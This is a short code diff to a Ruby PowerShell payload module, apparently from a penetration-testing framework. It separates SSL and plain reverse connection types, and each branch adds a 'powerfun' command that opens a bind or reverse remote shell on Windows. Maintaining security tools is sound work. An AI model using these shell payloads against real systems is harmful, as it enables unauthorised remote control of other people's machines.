@@ -23,8 +23,10 @@ module Payload::Windows::Powershell
 
     if conntype == "Bind"
       script_in << "\npowerfun -Command bind"
-    elsif conntype == "Reverse"
+    elsif conntype == "Ssl"
       script_in << "\npowerfun -Command reverse -Sslcon true"
+    elsif conntype == "Reverse"
+      script_in << "\npowerfun -Command reverse"
     end
 
     if datastore['LOAD_MODULES']
